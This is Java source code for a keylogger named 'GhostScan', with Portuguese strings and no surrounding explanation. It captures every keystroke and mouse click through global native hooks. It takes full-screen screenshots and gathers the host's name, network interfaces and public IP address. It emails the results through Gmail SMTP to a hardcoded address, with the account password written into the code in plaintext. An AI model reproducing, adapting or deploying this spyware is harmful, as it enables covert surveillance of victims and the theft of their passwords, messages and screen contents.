package key;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Point;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.io.BufferedReader;
import java.io.File;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InterfaceAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import javax.imageio.ImageIO;
import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.HtmlEmail;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;
import java.util.Date;
import java.text.DateFormat;
import java.text.SimpleDateFormat;

public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {
	private static Point mou;
	private static String mouse;
	private static String var;
	private static String varchar;
	private static GlobalScreen global;
	private static boolean click = false;
	private static int numberKeys = 0;

	private static String getDateTime() {
		DateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
		Date date = new Date();
		return dateFormat.format(date);
	}

	private static String getIP() {
		String ip = "N�o definido";
		try {
			URL whatismyip = new URL("http://checkip.amazonaws.com");
			BufferedReader in = null;
			in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
			ip = in.readLine();
		} catch (IOException e) {
		}
		return ip;
	}

	public void nativeMouseReleased(NativeMouseEvent arg0) {
		click = true;
	}

	public void nativeMouseDragged(NativeMouseEvent arg0) {
		click = true;
	}

	public void nativeMouseMoved(NativeMouseEvent es) {
	}

	public void nativeMouseClicked(NativeMouseEvent es) {
		
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		numberKeys = numberKeys + 1;
		if (e.getKeyCode() == NativeKeyEvent.VC_1) {
			var = "1";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_2) {
			var = "2";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_3) {
			var = "3";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_4) {
			var = "4";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_5) {
			var = "5";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_6) {
			var = "6";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_7) {
			var = "7";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_8) {
			var = "8";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_9) {
			var = "9";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_0) {
			var = "0";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_SPACE) {
			var = " ";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_ENTER) {
			var = "<br>";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_BACKSPACE) {
			var = "[backspace]";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_TAB) {
			var = "[tab]";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_COMMA) {
			var = ",";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_PERIOD) {
			var = ".";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_UP) {
			var = "[cima]";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_DOWN) {
			var = "[baixo]";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_LEFT) {
			var = "[esquerda]";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_RIGHT) {
			var = "[direita]";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK) {
			var = "[capslock]";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_DELETE) {
			var = "[delete]";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_INSERT) {
			var = "[insert]";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_F24) {
			var = "+";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_F23) {
			var = "*";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_EQUALS) {
			var = "=";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_SLASH) {
			var = "/";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_A) {
			var = "a";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_B) {
			var = "b";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_C) {
			var = "c";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_D) {
			var = "d";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_E) {
			var = "e";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_F) {
			var = "f";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_G) {
			var = "g";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_H) {
			var = "h";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_I) {
			var = "i";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_J) {
			var = "j";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_K) {
			var = "k";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_L) {
			var = "l";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_M) {
			var = "m";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_N) {
			var = "n";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_O) {
			var = "o";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_P) {
			var = "p";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_Q) {
			var = "q";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_R) {
			var = "r";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_S) {
			var = "s";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_T) {
			var = "t";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_U) {
			var = "u";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_V) {
			var = "v";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_W) {
			var = "w";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_X) {
			var = "x";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_Y) {
			var = "y";
		}
		if (e.getKeyCode() == NativeKeyEvent.VC_Z) {
			var = "z";
		}
		varchar += var;
		
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
	}

	public void nativeMousePressed(NativeMouseEvent es) {
		
		mou = es.getPoint();
		double positionx = mou.getX();
		double positiony = mou.getY();
		String position = null;
		String position1 = null;
		if (positionx < 70 & positiony < 70) {
			position = "canto esquerdo(cabe�alho),";
			position1 = "(topo, esquerda)";
			mouse += position + position1;
		}
		if (positionx < 170 & positiony > 600) {
			position = "canto esquerdo(Rodap�),";
			position1 = "(rodap�, esquerda)";
			mouse += position + position1;
		}
		if (positionx < 170 & positiony > 190) {
			position = "lateral esquerda,";
			position1 = "(meio, esquerda)";
			mouse += position + position1;
		}
		if (positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300) {
			position = "Centro da p�gina,";
			position1 = "(meio, pr�ximo ao topo e esquerda)";
			mouse += position + position1;
		}
		if (positionx > 270 & positiony > 400 & positionx < 400) {
			position = "Centro da p�gina,";
			position1 = "(meio, pr�ximo ao rodap� e esquerda)";
			mouse += position + position1;
		}
		if (positionx > 170 & positiony < 190) {
			position = "Topo da p�gina(cabe�alho),";
			position1 = "(topo, pr�ximo � esquerda)";
			mouse += position + position1;
		}
		if (positionx > 400 & positiony < 190) {
			position = "Topo da p�gina(cabe�alho),";
			position1 = "(topo, pr�ximo � direita)";
			mouse += position + position1;
		}
		
		
		
	}

	public static void main(String[] args) throws EmailException, IOException {
		new Thread(new Runnable(){
			@Override
			public void run(){
				while(true){
				if(click || numberKeys == 5){
					HtmlEmail email = new HtmlEmail();
					try {
						email.setHostName("smtp.gmail.com");
						email.setSmtpPort(465);
						email.addTo("bftcorporations@gmail.com", "X");
						email.setFrom("bftcorporations@gmail.com", "X");
			
						List list = new ArrayList();
						String info = "Obtendo Informac�es da Rede:";
						InetAddress addr = null;
						try {
							addr = InetAddress.getLocalHost();
						} catch (UnknownHostException e1) {
							e1.printStackTrace();
						}
						byte[] ipAddr = addr.getAddress();
						String hostname = addr.getHostName();
						String computerName = "Nome do Computador completo: " + hostname;
						InetAddress localHost = null;
						try {
							localHost = Inet4Address.getLocalHost();
						} catch (UnknownHostException e1) {
							e1.printStackTrace();
						}
						NetworkInterface networkInterface = null;
						try {
							networkInterface = NetworkInterface.getByInetAddress(localHost);
						} catch (SocketException e1) {
							e1.printStackTrace();
						}
						String placa = "Placa: " + networkInterface.getDisplayName();
						String rede = "Rede: " + networkInterface.getInterfaceAddresses();
						String address1 = null, iface1 = null, bc1 = null, mask1 = null;
						String infoRede = null;
						Enumeration ifaces = null;
						try {
							ifaces = NetworkInterface.getNetworkInterfaces();
						} catch (SocketException e1) {
							e1.printStackTrace();
						}
						while (ifaces.hasMoreElements()) {
							NetworkInterface iface = (NetworkInterface) ifaces.nextElement();
							String face = "Obtendo Informac�es da interface: " + iface.getName();
							iface1 += face + "<br>";
							for (InterfaceAddress address : iface.getInterfaceAddresses()) {
								String ipAddress = "IP........: " + address.getAddress().toString();
								address1 += ipAddress + "<br>";
								String bc = "Broadcast.: " + address.getBroadcast();
								bc1 += bc + "<br>";
								String mask = "M�scara...: " + address.getNetworkPrefixLength();
								mask1 += mask + "<br>";
							}
						}
						try {
							Robot robot = new Robot();
							Toolkit toolkit = Toolkit.getDefaultToolkit();
							final Dimension dimension = toolkit.getScreenSize();
							BufferedImage bi = robot
									.createScreenCapture(new Rectangle(0, 0, dimension.width, dimension.height));
							try {
								ImageIO.write(bi, "JPEG", new File("camera.JPEG"));
							} catch (IOException ey) {
								ey.printStackTrace();
							}
						} catch (AWTException e1) {
							e1.printStackTrace();
						}
						String getIp = getIP();
						StringBuilder builder = new StringBuilder();
						builder.append("<html>" + "<body>" + "<h1>GhostScan - " + getDateTime() + "-" + hostname + "</h1>"
								+ "<p><font color='green'>teclado: </font> " + varchar + "</p>" + "</body>" + "</html>");
						email.setMsg(builder.toString());
					} catch (EmailException e1) {
						e1.printStackTrace();
					}
					EmailAttachment anexo = new EmailAttachment();
					anexo.setPath("camera.JPEG");
					anexo.setDisposition(EmailAttachment.ATTACHMENT);
					anexo.setName("camera.JPEG");
					try {
						email.attach(anexo);
					} catch (EmailException e1) {
						e1.printStackTrace();
					}
					email.setSubject("GhostScan");
					email.setSSL(true);
					email.setAuthentication("bftcorporations@gmail.com", "BruteForce001");
					try {
						email.send();
						System.out.println("ENVIANDO CARACTERES");
					} catch (EmailException e1) {
						e1.printStackTrace();
					}
					numberKeys = 0;
					click = false;
					varchar = "";
				}	
				}
			}
		}).start();
		
		
		System.out.println();
		Date date = new Date();
		String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);
		System.out.println();
		String ocult = null;
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException ex) {
			System.err.println(ex.getMessage());
			System.exit(1);
		}
		try {
			global.registerNativeHook();
			global.addNativeKeyListener(new KeyLogger());
			global.addNativeMouseListener(new KeyLogger());
		} catch (NativeHookException e) {
			e.printStackTrace();
			System.exit(1);
		}
	}
}